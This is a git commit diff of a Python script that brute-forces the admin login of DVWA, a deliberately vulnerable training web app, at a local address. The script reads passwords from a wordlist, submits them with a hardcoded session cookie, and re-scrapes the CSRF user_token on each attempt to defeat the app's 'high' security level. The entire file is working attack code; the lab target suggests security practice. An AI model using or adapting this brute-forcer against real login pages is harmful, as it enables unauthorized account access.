eb83c3843dd644961f14d456f960c1be57e67248
unknown <pika-piba@mail.ru>
2021-12-12 19:12:31 +0300

    finished

--- main.py
+++ main.py
@@ -1,40 +1,42 @@
-from sys import argv
 import requests
 from bs4 import BeautifulSoup as Soup
 
-def checking(html):
-    soup = Soup(html)
+filename = 'passwords.txt'
+success_message = 'Welcome to the password protected area admin'
+txt = open(filename)
+url = 'http://dvwa.local/vulnerabilities/brute/index.php'
+
+cookie = {'security': 'high', 'PHPSESSID': 'mlmi3nuh5pboft6bqpraql6aqr'}
+s = requests.Session()
+target_page = s.get(url, cookies=cookie)
+
+
+def checkSuccess(html):
+    soup = Soup(html, 'html.parser')
     search = soup.findAll(text=success_message)
+
     if not search:
         success = False
     else:
         success = True
     return success
 
-def bruteForce():
-    with open(filename) as f:
-        for password in f:
-            payload = {'username': 'admin', 'password': password, 'Login': 'Login', 'user_token': csrf_token}
-            r = s.get(url, cookies=cookie, params=payload)
-            success = checking(r.text)
-            if not success:
-                soup = Soup(r.text)
-                csrf_token = soup.findAll(attrs={"name": "user_token"})[0].get('value')
-            else:
-                return('Пароль: ' + password)
-    return('Совпадений не найдено')
 
-
-url = 'http://127.0.0.1/dvwa/vulnerabilities/brute/index.php'
-cookie = {'security': 'Low', 'PHPSESSID':'eogppved743ckngeo0so6tnp87'}
-
-script, filename, success_message = argv
-txt = open(filename)
-
-s = requests.Session()
-target_page = s.get(url, cookies=cookie)
 page_source = target_page.text
-soup = Soup(page_source)
+soup = Soup(page_source, 'html.parser')
 csrf_token = soup.findAll(attrs={"name": "user_token"})[0].get('value')
+with open(filename) as f:
+    print('Begin...')
+    for password in f:
+        payload = {'username': 'admin', 'password': password.rstrip('\r\n'), 'Login': 'Login', 'user_token': csrf_token}
+        r = s.get(url, cookies=cookie, params=payload)
+        success = checkSuccess(r.text)
+        if not success:
+            soup = Soup(r.text, 'html.parser')
+            csrf_token = soup.findAll(attrs={"name": "user_token"})[0].get('value')
+        else:
+            print('Password = : ' + password)
+            break
+    if not success:
+        print('Failed')
 
-print(bruteForce())
